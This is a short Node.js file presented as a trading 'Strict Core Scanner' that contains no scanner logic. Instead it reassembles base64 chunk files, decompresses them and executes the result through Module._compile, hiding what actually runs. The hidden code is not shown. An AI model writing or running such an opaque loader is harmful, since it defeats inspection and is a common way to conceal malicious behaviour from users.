/**
 * Strict Core Scanner v2.4.5
 * Direction: 1H+15M lock · 4H gate · anti-invert
 */
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const Module = require("module");
const b64 = [0, 1, 2]
  .map((i) => fs.readFileSync(path.join(__dirname, "engine.b64." + i), "utf8").trim())
  .join("");
const code = zlib.inflateSync(Buffer.from(b64, "base64")).toString("utf8");
const m = new Module(__filename, module.parent);
m.filename = __filename;
m.paths = Module._nodeModulePaths(__dirname);
m._compile(code, __filename);
